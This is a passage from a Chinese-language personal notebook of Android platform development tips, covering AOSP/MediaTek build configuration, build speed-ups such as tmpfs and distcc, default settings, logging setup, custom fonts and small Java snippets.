build/target/product/telephony.mk
build/target/product/core.mk

所以如果想使模拟器和真机都编译进去的话，就必须添加到core.mk
```

## [make]  [FAQ07241]  如何添加一个jni库模块到整理编译中?

```text
如在alps\packages\apps\Settings目录下增加目录，增加jni和android.mk文件 ，执行./mk mm packages\apps\Settings目录，是可以看到有jni的.so库文件生成到out\target\product\ztenj89_cu_jb\system\lib目录下，但执行./mk new时，没有生成相对应的so库。

[SOLUTION] 
1.alps\packages\apps\Settings 下的 Android.mk文件，将LOCAL_MODULE_TAGS设定为optional。
2.修改build\target\product\$project.mk文件，将所添加的module name添加到PRODUCT_PACKAGES中。
```

## [make]  [FAQ09283]  import android.support.v4, 提示 does not exist

```text
如果贵司在改写 android 某些apk 源码时
有使用到 android.support.v4 包中的元素, 比如 view
但在文件头去 import android.support.v4.view
却会提示此包或 class 不存在
 
[SOLUTION] 
需要修改这只 apk 的 mk 文件(android.mk)
找到 LOCAL_STATIC_JAVA_LIBRARIES 的定义
在其后面加入: android-support-v4
 
下面是一个例子:
修改前:
LOCAL_STATIC_JAVA_LIBRARIES := android-common-carousel \
                               com.mediatek.systemui.ext
 
修改后:
LOCAL_STATIC_JAVA_LIBRARIES := android-common-carousel \
                               com.mediatek.systemui.ext \
                               android-support-v4
 
 
 
同理, 如果是用到了 android.support.v13 中的 class
也需要在上述定义中追加 android-support-v13
```

## [make]  [FAQ10266]  [Audio Common]  如何内置歌曲和视频文件等资源到手机文件系统

```text
针对该需求，我们有客制化的SOP文档。请登录DCC搜索以下文件即可：“Make_And_DL_FAT_Image.ppt”。
```

## [make]  [FAQ03201]  如何在c/c++代码里引用自定义ProjectConfig.mk宏开关

```text
AUTO_ADD_GLOBAL_DEFINE_BY_NAME/AUTO_ADD_GLOBAL_DEFINE_BY_VALUE/AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE是编译系统开出的3个可以将ProjectConfig.mk中的宏(注意添加的宏必须大写)添加到C/C++源文件的接口。

[KEYWORD] 
AUTO_ADD_GLOBAL_DEFINE_BY_NAME
AUTO_ADD_GLOBAL_DEFINE_BY_VALUE
AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE
ProjectConfig.mk

[SOLUTION] 
详细如下:
AUTO_ADD_GLOBAL_DEFINE_BY_NAME:
如果你希望定义一个宏开关（作为一个功能模块的开关），然后在源文件(*.c/h等使用到这个宏开关)，比如你定义了一个XXX_SUPPORT这个宏的值只有yes和no。那么你可以在
ProjectConfig.mk中定义：
XXX_SUPPORT = yes
但是这样定义在源文件是找不到XXX_SUPPORT的，因此需要加入AUTO_ADD_GLOBAL_DEFINE_BY_NAME，加入之后就可以在源文件使用了，比如aa.c中：
#ifdef XXX_SUPPORT
......
#endif
注意：如果添加的宏的值为no/none/false（无论大小写），那么该宏不会被添加进去。

AUTO_ADD_GLOBAL_DEFINE_BY_VALUE:
同上，但是差别在于你希望将宏的值传给源文件，比如定义了：
XXX_TP = CTP#RTP or CTP
你希望在代码中去判断当前使用了RTP还是CTP，那么可以将XXX_TP加入AUTO_ADD_GLOBAL_DEFINE_BY_VALUE
这样在源文件中就可以引用了，比如aa.c中：
#ifdef CTP
......
#elif RTP
......
#endif
AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE:
它与AUTO_ADD_GLOBAL_DEFINE_BY_NAME差别在于AUTO_ADD_GLOBAL_DEFINE_BY_NAME只有定义和没有定义之分，而AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE还可以知道它的值是多少(注意这个值是字符串)，比如：
XXX_NUM = 1#1 or 2
那么加入AUTO_ADD_GLOBAL_DEFINE_BY_NAME_VALUE之后：
在源文件中就可以这样用(比如aa.c):
if (!strcmp(XXX_NUM, "1")) {
} else {
}
---------------
java部分的引用请参考：
[FAQ03202]  如何在java代码里引用自定义projectConfig.mk宏开关
```

## [make]  [工具]  [net]  [FAQ03969]  如何自己编译wireless tool

## [make] Android.mk Ninja Soong Blueprint kati Android.bp

```text
https://blog.csdn.net/itachi85/article/details/89038370

1.编译系统概述
了解以下一些概念，会对Android编译系统有大概的了解。
Makefile
Android平台的编译系统，其实就是用Makefile写出来的一个独立项目。它定义了编译的规则，实现了“自动化编译”，不仅把分散在数百个Git库中的代码整合起来、统一编译， 而且还把产物分门别类地输出到一个目录，打包成手机ROM，还可以生成应用开发时所使用的SDK、NDK等。
因此，采用Makefile编写的编译系统，也可以称为Makefile编译系统。
Android.mk
Makefile编译系统的一部分，定义了一个模块的必要参数，使模块随着平台编译。通俗来讲就是告诉编译系统，以什么样的规则编译你的源代码，并生成对应的目标文件。

Ninja
Ninja是一个致力于速度的小型编译系统，如果把其他的编译系统看作高级语言，那么Ninja 目标就是汇编。

Soong
Soong是谷歌用来替代此前的Makefile编译系统的替代品，负责解析Android.bp文件，并将之转换为Ninja文件

Blueprint
Blueprint用来解析Android.bp文件翻译成Ninja语法文件。

kati
kati是谷歌专门为了Android而开发的一个小项目，基于Golang和C++。 目的是把Android中的Makefile，转换成Ninja文件。

Android.bp
Android.bp，是用来替换Android.mk的配置文件。

Blueprint负责解析Android.bp文件内容，Blueprint类似一个处理相关语法的库文件，Soong则是定义具体如何处理相应的语法以及命令实现。通俗来讲就是Soong借助于Blueprint定义的Android.bp语法，完成Android.bp的解析，最终转换成Ninja文件。
Makefile文件会通过kati转换为Ninja文件。
随着Android工程越来越大，采用Makefile的编译系统花费的时间也越来越长，因此谷歌在Android 7.0开始引入了Ninja来编译系统，相对于Makefile来说Ninja在大的项目管理中速度和并行方面有突出的优势。
Makefile默认文件名为Makefile或makefile，也常用.make或.mk作为文件后缀。 Ninja的默认文件名是build.ninja，其它文件以.ninja为后缀。Makefile与Ninja的区别在于, Makefile是设计来给开发编写的，而Ninja设计出来是给其它程序生成的。如果Makefile是Java语言，那么Ninja就是汇编语言。

2.编译源码的方式
Androd系统源码编译有很多种方式，主要有以下几种：

在Linux中直接进行系统源码编译（Android官方支持）
在Mac OS中直接进行系统源码编译（Android官方支持）
使用Docker编译，支持Mac OS和Windows
其中需要注意的是，Docker的最低支持版本为Windows7，建议用Windows10环境下使用Docker，因为在Windows7种还需要借助Docker Toolbox和VirtualBox中的容器进行通信，效率相对低些。
考虑到大多数人的设备和上手难易程度，本为讲解在Linux中直接进行系统源码编译，如果你的系统不是Ubuntu，可以查看Android AOSP基础（一）VirtualBox 安装 Ubuntu这篇文章。
```

## [make] jack编译方式和传统编译方式的区别

```text
当然,如果开启了 Jack 编译,那么依赖关系会有所不同。Jack 与传统编译方式一个重要的区别就是,它会直接生成最终的 dex 文件—不过在 Static Java Library 的情况下它还需要生成.jack 文件。

Jack 并不输出中间状态的 jar 文件,而是直接得到最终的 dex 产物—这也是它会导致一些分析工具失效的原因,例如著名的 Jacoco 代码覆盖率工具。

android 整体编译失败之后如果log不容易看出问题的话，可以把 -j 设置为 1 之后再编译就比较容易看出问题
```

## [make] envsetup.sh 相关

```text
envsetup.sh 除了提供很多实用的函数外, envsetup.sh 在文件的最后还会扫描和加载 device 和 vendor 目录下的 vendorsetup.sh 文件
vendorsetup.sh 会通过 add_lunch_combo 命令来为 lunch 添加一条加载项
```

## [make] 编译打包java文件生成jar包的流程

```text
方法1：通过eclipse中的export导出来，但这样生成的 jar 包会包含一些其他jar包，导致生成的jar包比较大

方法2：通过命令行打包
javac -encoding UTF-8 Main.java                 //生成 .class 字节码文件
jar cvf Main.jar Main.class     //生成 Main.jar 文件
然后用 rar 等压缩工具打开 Main.jar , 在 META-INF/MANIFEST.MF 文件的最下面添加 Main-Class: Main
或
jar cvfe libparser.jar  ParseApk  ParseApk.class    //直接把第二个参数 ParseApk 设置为 Main-Class，写入到 MANIFEST.MF 文件中
```

## [make] Android P 编译 framework 及 push framework 后机器能起来修改

```text
https://blog.csdn.net/iamdy/article/details/84884046
https://blog.csdn.net/lei7143/article/details/91396532

build/make/core/dex_preopt.mk

修改 DEX_PREOPT_DEFAULT ?= false
```

## [make] Android配置编译资源

```text
一：编译源码不要生成odex 问题： 
    1： 禁止apk生成odex： 修改../build/core/package.mk   
          LOCAL_DEX_PREOPT := ture  -> LOCAL_DEX_PREOPT := false
    2： 禁止jar包生成odex： 修改/build/core/java_library.mk  
          LOCAL_DEX_PREOPT := ture  ->  LOCAL_DEX_PREOPT:= false  
    3： 禁止当前apk编译生成odex,在android.mk内增加：
          LOCAL_DEX_PREOPT := false

二：配置编译的时候使用的资源mdpi / hdpi / xhdpi
   进入build/core/product_config.mk文件：
# Default to medium-density assets.
# (Can be overridden in the device config,e.g.: PRODUCT_AAPT_CONFIG += hdpi)
PRODUCT_AAPT_CONFIG := $(strip \
    $(PRODUCT_AAPT_CONFIG) \
    $(if$(filter %dpi,$(PRODUCT_AAPT_CONFIG)),,mdpi))
PRODUCT_AAPT_PREF_CONFIG := $(strip$(PRODUCT_AAPT_PREF_CONFIG))
PRODUCT_AAPT_CONFIG := mdpi xlarge hdpi xhdpilarge
修改PRODUCT_AAPT_CONFIG := mdpi那么会有限编译mdpi下的资源文件，如果mdpi目录下没有对应的文件才会去hdpi下面去查找。
```

## [make]  [log] Android在framework和hal添加log

```text
1.在Android.mk添加
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)
LOCAL_C_INCLUDES:= $(LOCAL_PATH)/include
LOCAL_SRC_FILES:= test.c
LOCAL_MODULE := libtest
LOCAL_SHARED_LIBRARIES:= libcutils libutils     ## 添加对应的库
LOCAL_MODULE_TAGS := optional

2.在test.c中添加
#include <utils/Log.h>
#define LOG_TAG “test”

ALOGE("xxx—————> %s(), %d\n",__FUNCTION__,__LINE__);
```

## [make] tmpfs优化编译速度

```text
[make] tmp 分区，利用 ramdisk?

tmpfs
有人说在Windows下用了RAMDisk把一个项目编译时间从4.5小时减少到了5分钟，也许这个数字是有点夸张了，不过粗想想，把文件放到内存上做编译应该是比在磁盘上快多了吧，尤其如果编译器需要生成很多临时文件的话。
这个做法的实现成本最低，在Linux中，直接mount一个tmpfs就可以了。而且对所编译的工程没有任何要求，也不用改动编译环境。
sudo mount -t tmpfs tmpfs /tmp -o size=2G
用2.6.32.2的Linux Kernel来测试一下编译速度：
用物理磁盘：40分16秒
用tmpfs：39分56秒

呃……没什么变化。看来编译慢很大程度上瓶颈并不在IO上面。但对于一个实际项目来说，编译过程中可能还会有打包等IO密集的操作，所以只要可能，用tmpfs是有益无害的。当然对于大项目来说，你需要有足够的内存才能负担得起这个tmpfs的开销。
```

## [make] distcc 多台电脑一起编译

```text
一台机器的能力有限，可以联合多台电脑一起来编译。这在公司的日常开发中也是可行的，因为可能每个开发人员都有自己的开发编译环境，它们的编译器版本一般是一致的，公司的网络也通常具有较好的性能。这时就是distcc大显身手的时候了。

使用distcc，并不像想象中那样要求每台电脑都具有完全一致的环境，它只要求源代码可以用make -j并行编译，并且参与分布式编译的电脑系统中具有相同的编译器。因为它的原理只是把预处理好的源文件分发到多台计算机上，预处理、编译后的目标文件的链接和其它除编译以外的工作仍然是在发起编译的主控电脑上完成，所以只要求发起编译的那台机器具备一套完整的编译环境就可以了。

distcc安装后，可以启动一下它的服务：

/usr/bin/distccd  --daemon --allow 10.64.0.0/16

默认的3632端口允许来自同一个网络的distcc连接。

然后设置一下DISTCC_HOSTS环境变量，设置可以参与编译的机器列表。通常localhost也参与编译，但如果可以参与编译的机器很多，则可以把localhost从这个列表中去掉，这样本机就完全只是进行预处理、分发和链接了，编译都在别的机器上完成。因为机器很多时，localhost的处理负担很重，所以它就不再“兼职”编译了。

export DISTCC_HOSTS="localhost 10.64.25.1 10.64.25.2 10.64.25.3"

然后与ccache类似把g++，gcc等常用的命令链接到/usr/bin/distcc上就可以了。

在make的时候，也必须用-j参数，一般是参数可以用所有参用编译的计算机CPU内核总数的两倍做为并行的任务数。
同样测试一下：

一台双核计算机，make -j4：23分16秒
两台双核计算机，make -j4：16分40秒
两台双核计算机，make -j8：15分49秒

跟最开始用一台双核时的23分钟相比，还是快了不少的。如果有更多的计算机加入，也可以得到更好的效果。
在编译过程中可以用distccmon-text来查看编译任务的分配情况。distcc也可以与ccache同时使用，通过设置一个环境变量就可以做到，非常方便。
```

## [make] 配置 swap 分区

```text
sudo swapon --show
mkdir /swap
cd /swap
sudo dd if=/dev/zero of=swapfile bs=1024 count=16000000
sudo mkswap -f swapfile
sudo swapon swapfile
sudo swapoff swapfile
在 /etc/fstab 下添加 /swap/swapfile /swap swap defaults 0 0

```

## [make] android 修改了userdata分区大小，如何编译

```text
1.修改userdata 大小配置文件
2. source build/envsetup.
3. lunch xx
4. make otapackage -jxx
```

## [make] Android.bp 支持的预编译

```text
以Bluetooth为例子，其中
动态库 : android.hardware.bluetooth@1.0-impl
静态库 : android.hardware.bluetooth-async android.hardware.bluetooth-hci
运行库 : android.hardware.bluetooth@1.0-service
```

## [make] 通过编写OverlayApp来替换第三方app(如GoogleMessage)中的资源

```text
编写overlay app
通过上面反编译步骤我们得到了，需要反编译应用的包名和res。下面我们就可以编写对应的overlay app了
新建文件加GoogleMessageOverlay
创建Android.mk,AndroidManifest.xml,res 等文件。
Android.mk

LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE_TAGS := optional

LOCAL_MODULE_PATH := $(TARGET_OUT_VENDOR)/overlay

#include files in src directory
LOCAL_SRC_FILES := $(call all-subdir-java-files)

LOCAL_PROPRIETARY_MODULE := true

#include files in res diretory
LOCAL_RESOURCE_DIR := $(LOCAL_PATH)/res
LOCAL_SDK_VERSION = current

#the name of target apk
LOCAL_PACKAGE_NAME := GoogleMessageOverlay
include $(BUILD_PACKAGE)


AndroidManifest.xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.google.android.apps.messaging.overlay">
    <overlay
        android:isStatic="true"
        android:priority="1"
        android:targetPackage="com.google.android.apps.messaging" />
</manifest>

将plurals.xml打开找到对应的string id修改就可以了。
编译overlay app
生成的app在out 下的vendor/overlay中。
```

## [make] Android P 系统编译之使用 PRODUCT_COPY_FILES 拷贝文件或文件夹

```text
Android开发中有一个常见的需求，就是把我们App开发的应用，拷贝到system/app目录下，当成一个系统级应用，然后一起打包升级。
Android系统编译生成目录：out\target\product<platform-name>
Android编译mk文件目录：build\core
我是在build\make\core\envsetup.mk中进行修改的：
注意build\core\envsetup.mk是link到目录build\make\core下面的。

增加：
#PRODUCT_COPY_FILES += device/fsl/imx8q/userdata/app:$(TARGET_OUT_APPS)
PRODUCT_COPY_FILES += $(call find-copy-subdir-files,*,device/fsl/imx8q/userdata/app,system/app)
PRODUCT_COPY_FILES += $(call find-copy-subdir-files,*,device/fsl/imx8q/userdata/priv-app,system/priv-app)

ifeq ($(TARGET_IS_64_BIT),true)
# /system/lib always contains 32-bit libraries,
# and /system/lib64 (if present) always contains 64-bit libraries.
#PRODUCT_COPY_FILES += device/fsl/imx8q/userdata/lib64:$(TARGET_OUT_SHARED_LIBRARIES)
PRODUCT_COPY_FILES += $(call find-copy-subdir-files,*,device/fsl/imx8q/userdata/lib64,system/lib64)
else
#PRODUCT_COPY_FILES += device/fsl/imx8q/userdata/lib:$(TARGET_OUT_SHARED_LIBRARIES)
PRODUCT_COPY_FILES += $(call find-copy-subdir-files,*,device/fsl/imx8q/userdata/lib,system/lib)
endif
#PRODUCT_COPY_FILES += device/fsl/imx8q/userdata/framework:$(TARGET_OUT_PRODUCT_JAVA_LIBRARIES)
PRODUCT_COPY_FILES += $(call find-copy-subdir-files,*,device/fsl/imx8q/userdata/framework,system/framework)
PRODUCT_COPY_FILES解析：
1、使用PRODUCT_COPY_FILES拷贝文件：

PRODUCT_COPY_FILES += device/qcom/media/demo.xml:system/etc/demo.xml
将文件device/qcom/media/demo.xml拷贝到system/etc/demo.xml下。

2、使用PRODUCT_COPY_FILES拷贝文件夹：

PRODUCT_COPY_FILES += $(call find-copy-subdir-files,*,device/fsl/imx8q/userdata/app,system/app)
将文件夹device/qcom/userdata/app下面的所有的文件拷贝到文件夹system/app下。

我这里system/app目录是out\target\product<platform-name>下面的目录。

编译报错：
[1009/1009]  including vendor/nxp/linux-firmware-imx/firmware/Android.mk …
build/make/core/Makefile:29: error: Prebuilt apk found in PRODUCT_COPY_FILES: device/fsl/imx8q/userdata/app/CarControl/CarControl.apk:system/ap/CarControl/CarControl.apk, use BUILD_PREBUILT instead!.
19:28:48 ckati failed with: exit status 1

问题原因：原因是系统编译文件对拷贝apk文件做了限制检查，不允许拷贝apk文件。
解决方法：修改build\core\Makefile,注释掉check-product-copy-files的定义

#define check-product-copy-files
#$(if $(filter-out $(TARGET_COPY_OUT_SYSTEM_OTHER)/%,$(2)), \
#  $(if $(filter %.apk, $(2)),$(error \
#     Prebuilt apk found in PRODUCT_COPY_FILES: $(1), use BUILD_PREBUILT instead!)))
#endef
```

## [make] Android源码中编译出指定jar包 ：settingslib

```text
想把android源码frameworks/base/packages/SettingsLib下的源码编译成 settingslib.jar，编译完后，在out/target/common/obj/JAVA_LIBRARIES/SettingsLib_intermediates发现是class.jack，没有jar包，解决方案如下：

1.AOSP如何编译生成java包

1.Android.mk中将#include $(BUILD_JAVA_LIBRARY)等 改为include $(BUILD_STATIC_JAVA_LIBRARY)
2.在Android.mk中增加 LOCAL_JACK_ENABLED := disabled
3. mm编译后在out/target/common/obj/JAVA_LIBRARIES/$(LOCAL_MODULE)_intermediates中找到classes.jar即是。
2.如果该方式出现了问题，还是解决不了。那你可以尝试直接使用最终解决方案。

找到源码下该文件：
/build/core/combo/javac.mk

//将下面的配置设置为false；
ANDROID_COMPILE_WITH_JACK := false
重新构建会在out/target/common/obj/JAVA_LIBRARIES/xxxx_intermediates再次生成classes.jar
```

## [make] 编译资源找不到的问题

```text
现象：strings.xml明明存在某个变量的定义，或是drawable-*dpi里明明存在某个资源图片，但编译时总是提示此资源无定义

建议：touch下出错资源文件，说不定会有意想不到的效果。
```

#####################################################################################################
#####################################################################################################
########################################## make end #################################################
#####################################################################################################
#####################################################################################################

## [默认值] 39Ogo默认壁纸(其他的一些属性也会在 device/mediatek/common/overlay/ago/ 目录下overlay)

```text
device/mediatek/common/overlay/ago/frameworks/base/core/res/res/drawable-nodpi/default_wallpaper.jpg
```

## [默认值] 修改默认浏览器搜索引擎为google

```text
https://blog.csdn.net/wobushizhainan/article/details/79872757

修改方案:
把如下文件中的 google 移动到最上面第一条即可
M:alps/vendor/mediatek/proprietary/frameworks/base/res/res/values*/donottranslate-new-search_engines.xml
<resources xmlns:xliff="urn:oasis:names:tc:xliff:document:1.2">
    <string-array name="new_search_engines" translatable="false">
        <item>--</item>
        <item>google--Google--google.com--search_engine_google--http://www.google.com/m?hl={language}&amp;ie={inputEncoding}&amp;source=android-browser&amp;q={searchTerms}--UTF-8--http://www.google.com/complete/search?hl={language}&amp;json=true&amp;q={searchTerms}</item>
        <item>start--Start--mt.start.fyi--search_engine_other--http://mt.start.fyi/search?ie={inputEncoding}&amp;source=browser#gsc.q={searchTerms}--UTF-8--http://www.google.com/complete/search?hl={language}&amp;json= true&amp;q={searchTerms}</item>
        <item>yahoo--Yahoo!--yahoo.com--search_engine_yahoo--https://search.yahoo.com/search?ei={inputEncoding}&amp;.tsrc=mtkandroid&amp;p={searchTerms}--UTF-8--http://sugg.search.yahoo.com/gossip/?output=fxjson&amp;command={searchTerms}</item>
        <item>bing--Bing--bing.com--search_engine_bing--http://www.bing.com/search?q={searchTerms}--UTF-8--http://api.bing.com/osjson.aspx?query={searchTerms}&amp;language={language}</item>
    </string-array>
</resources>
```

## [默认值] 8.0O版本上默认打开数据连接

```text
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commitdiff;h=c0729839d0b3a73c3b67e58d1f4cd20f3068e446;hp=2991172ce00d8c7b979b2cf405f2a8fe417be2e2
```

## [开源] java操作excel的类库

```text
POI
http://poi.apache.org/download.html
```

## [log] 修改信号log的抓取

```text
修改：
vendor/mediatek/proprietary/hardware/ril/fusion/mtk-ril/mdcomm/nw/RmcNetworkHandler.cpp
的 updateSignalStrengthProperty() 方法中有
编译：
./mk -ud DFC0270_VF292_7030_DORO_S01A mm vendor/mediatek/proprietary/hardware/ril/fusion/mtk-ril/
adb root;adb remount;
adb push out/target/product/k39tv1_bsp_512/vendor/lib/libmtk-ril.so vendor/lib/;
push之后需要重启
adb reboot;
```

## [log] 信号强度

```text
在Android手机上，通过“设置”-“关于手机”-“状态”-“信号强度”可以查看到手机的信号强度，显示出如“-87 dBm 13 asu”这样的数据。
ASU与dBm之间的关系是：dBm=-113+（2*ASU）。在你手机屏幕上方显示的信号条永远不会是最好的方法来确定你手机的信号，无论你用什么手机都一样。
Android也是，用很粗的条来展示很强的信号，但这些条仅仅表示最高的信号。
或许你并不熟悉，信号通常是以dBm度量的。dBm是每毫瓦特的电磁波产生的功率。-60dBm的信号接近完美，-112dBm就很容易掉线，如果你在 -87dBm以上，Android会显示一个4格的满信号。
android界面UI信号显示是通过RIL对通讯模块发送AT命令来实现的，如AT+CSQ，我们查看一般可以通过 logcat -b radio来获取一些RIL的实时信息，可以通过关键字“CSQ”查找radio.log，查看手机信号强度。
log如：AT< +CSQ: 14,99  这里的14就是ASU值，在4.0源码中有SignalStrength.Java类，其中有ASU值转换为几格信号的方法
```

## [Snippet] 修改 TextView 的省略号

```text Java
- effectiveEllipsize = TruncateAt.END_SMALL;
+ effectiveEllipsize = TruncateAt.END;
```

## [OTA] OTA 升级之后没有走 DatabaseHelper.java 中的 onUpgrade() 方法

```text
o上走的是 SettingsProvider.java 中的 onUpgradeLocked() 方法
```

## framework下字体文件的修改

```text
1.将需要添加的ttf字体文件放在 frameworks/base/data/fonts/ 目录

A:frameworks/base/data/fonts/hiosClock_thin.ttf

2.修改 frameworks/base/data/fonts/Android.mk 文件,将字体文件编译到 system/fonts/ 目录中

M:frameworks/base/data/fonts/Android.mk
#Redmine124982 modified for clock widget font 2018/03/23:begin
font_src_files := \
    AndroidClock.ttf \
    hiosClock_thin.ttf
#Redmine124982 modified for clock widget font 2018/03/23:end

3.修改 frameworks/base/data/fonts/fonts.mk 文件

M:frameworks/base/data/fonts/fonts.mk
#Redmine124982 modified for clock widget font 2018/03/23:begin
PRODUCT_PACKAGES := \
    DroidSansMono.ttf \
    AndroidClock.ttf \
    hiosClock_thin.ttf \
    fonts.xml
#Redmine124982 modified for clock widget font 2018/03/23:end

4.在 fonts.xml 文件中定义字体对应的名称

M:frameworks/base/data/fonts/fonts.xml
<!--Redmine124982 modified for clock widget font 2018/03/23:begin-->
<family name="tecno-clock-font">
    <font weight="400" style="normal">hiosClock_thin.ttf</font>
</family>
<!--Redmine124982 modified for clock widget font 2018/03/23:end-->

5.使用新添加的字体

方法1:
TextView textView = new TextView(mContext);
textView.setTypeface(android.graphics.Typeface.createFromFile("/system/fonts/hiosClock_thin.ttf"));

方法2:
<TextView
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:fontFamily="tecno-clock-font" />

6.在项目中的具体使用实例----Bug124982 修改桌面时钟widget的字体

M:alps/frameworks/base/core/java/android/widget/RemoteViews.java
public class RemoteViews implements Parcelable, Filter {
    ...
    private class TextViewSizeAction extends Action {
        ...
        @Override
        public void apply(View root, ViewGroup rootParent, OnClickHandler handler) {
            final TextView target = root.findViewById(viewId);
            if (target == null) return;

            //通过特殊约定的参数(如77,0)来特殊设置TextView的字体
            if(units == -77 && size == 0f){
                target.setTypeface(android.graphics.Typeface.createFromFile("/system/fonts/hiosClock_thin.ttf"));
            }else{
                target.setTextSize(units, size);
            }
        }
        ...
    }
    ...
}

M:alps/vendor/mediatek/proprietary/packages/apps/DeskClock/src/com/android/alarmclock/DigitalAppWidgetProvider.java
public class DigitalAppWidgetProvider extends AppWidgetProvider {
    private static RemoteViews relayoutWidget(Context context, AppWidgetManager wm, int widgetId, Bundle options, boolean portrait) {
        final String packageName = context.getPackageName();
        final RemoteViews rv = new RemoteViews(packageName, R.layout.digital_widget);
        //通过特殊约定的参数(如77,0)来特殊设置TextView的字体,这里调用setTextViewTextSize方法就会调用RemoteViews的内部类TextViewSizeAction的apply方法
        rv.setTextViewTextSize(R.id.clock, -77, 0f);
        ...
    }
    ...
}
```

## [Snippet] 监听 SharePreference 的变化

```text Java
SharedPreferences sp1 = getSharedPreferences(getPackageName() + "test", MODE_PRIVATE);
sp1.registerOnSharedPreferenceChangeListener(new SharedPreferences.OnSharedPreferenceChangeListener() { 
    @Override 
    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
    }
});
```

## [Snippet] 通过监听布局变化来获取view的高度和宽度

```text Java
private int mViewHeight;
private View mView;
...
//注册监听
mView.getViewTreeObserver().addOnGlobalLayoutListener(
    new OnGlobalLayoutListener() {
        @Override
        public void onGlobalLayout() {
            //获取View高度
            mViewHeight = mView.getHeight();
            //取消监听，否则该方法会不断回调
            mView.getViewTreeObserver().removeGlobalLayoutListener(this);
        }
    }
)
```

## [FAQ06189]  插国外SIM卡，第一次开机语言没有自适应

问题描述：在有些国家进行场测时，插该国SIM卡（比如俄罗斯），首次开机语言自适应结果是英文，应该变成俄语。而使用中国SIM卡测试该功能时正常的。
问题原因：语言自适应需要通过利用SIM卡MCC信息查表来实现，而此表内容对于每个国家并不一样，有些国家没有默认语言，只有较少国家有默认语言。
解决方案：补充该表，使每个国家都有默认语言。

```text Java
frameworks\base\telephony\java\com\android\internal\telephony\MccTable.java
table = new ArrayList<MccEntry>(240);
table.add(new MccEntry(202,"gr",2,"el"));//Greece
```

## [Snippet] 读取图片Exif信息

```text Java
package com.test;
import java.io.File;
import java.io.IOException;
import java.util.Iterator;
import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

public class ReadPic {
    /** 导入标签，使用metadata-extractor */
    public static void main(String[]  args) {
        readPic();
    }
    /** 处理 单张 图片 */
    private static void readPic() {
        File jpegFile = new File("d:\\002.jpg");
        Metadata metadata;
        try {
            metadata = JpegMetadataReader.readMetadata(jpegFile);
            Iterator<Directory> it = metadata.getDirectories().iterator();
            while (it.hasNext()) {
                Directory exif = it.next();
                Iterator<Tag> tags = exif.getTags().iterator();
                while (tags.hasNext()) {
                    Tag tag = (Tag) tags.next();
                    System.out.println(tag);

                }
            }
        } catch (JpegProcessingException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

## [log] 如何设置MTKlogger是否开机自启动

```text Java
1. 第一次开机MTKlogger是否开启

1) 配置prop文件:   true则开启，false则关闭 
com.mediatek.log.mobile.enabled = true/false
com.mediatek.log.modem.enabled = true/false
com.mediatek.log.net.enabled = true/false
com.mediatek.log.gps.enabled = true/false

2) prop文件路径
KK版本: alps/mediatek/external/xlog/tools/mtklog-config-eng.prop或mtklog-config-user.prop
L 版本:  alps/vendor/mediatek/proprietary/external/xlog/tools/mtklog-config-eng.prop或mtklog-config-user.prop
M/N版本:  alps/device/mediatek/common/mtklog/mtklog-config-bsp-eng.prop或mtklog-config-bsp-user.prop

2. 非第一次开机是否开启的配置方法有如下两种

1) 勾选Start Automatically进行设置
MTKlogger UI——》Settings——》MobileLog/ModemLog/NetworkLog/GPSLog——》Start Automatically

2) 通过adb发送广播设置
adb shell am broadcast -a com.mediatek.mtklogger.ADB_CMD -e cmd_name set_auto_start_1/set_auto_start_0 --ei   cmd_target 23
set_auto_start_1表示开启开机自启动, set_auto_start_0表示关闭开机自启动
cmd_target is a combination or just a single of each Log type
MobileLog: 1 ModemLog: 2 NetworkLog: 4 GPSLog: 16
```

## [Snippet] java使用代理访问网络

```text Java
使用代码的方式：
String proxyHost = "127.0.0.1";
String proxyPort = "1080";

System.setProperty("http.proxyHost", proxyHost);
System.setProperty("http.proxyPort", proxyPort);

System.setProperty("https.proxyHost", proxyHost);
System.setProperty("https.proxyPort", proxyPort);

使用参数的方式：
-Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1080 -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=1080
```

## android 7.0 之后启动服务必须 startForegroundService()

```text
Prior to Android 8.0, the usual way to create a foreground service was to create a background service, then promote that service to the foreground. With Android 8.0, there is a complication; the system doesn't allow a background app to create a background service. For this reason, Android 8.0 introduces the new method startForegroundService() to start a new service in the foreground. After the system has created the service, the app has five seconds to call the service's startForeground() method to show the new service's user-visible notification. If the app does not call startForeground() within the time limit, the system stops the service and declares the app to be ANR.
```

## [Snippet] 设置 EditText 的游标颜色

```text
方法一、通过XML文件设置
TextView 有一个属性 android:textCursorDrawable，这个属性是用来控制光标颜色的
android:textCursorDrawable="@null"，"@null"作用是让光标颜色和text color一样

也可以自定义游标的颜色
cursor.xml
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle">
    <size android:width="1dp" />
    <solid android:color="#008000" />
</shape>
android:textCursorDrawable="@drawable/cursor"

方法二、通过代码设置
遗憾的是 TextView 默认没有设置游标颜色的方法
在 TextView.java 中找到
    case com.android.internal.R.styleable.TextView_textCursorDrawable:
        mCursorDrawableRes = a.getResourceId(attr, 0);
        break;
int mCursorDrawableRes;     //这个值是不可以被直接访问的

于是就想到可以使用反射来设置游标的颜色
try {
    Field f = TextView.class.getDeclaredField("mCursorDrawableRes");
    f.setAccessible(true);
    f.set(editText, R.drawable.cursor_color);
} catch (Exception ignored) {
}

也可以使用如下封装好的方法
private void setTextCursorColor(TextView et, int color){
    try {
        java.lang.reflect.Field fCursorDrawableRes = TextView.class.getDeclaredField("mCursorDrawableRes");
        fCursorDrawableRes.setAccessible(true);
        int mCursorDrawableRes = fCursorDrawableRes.getInt(et);
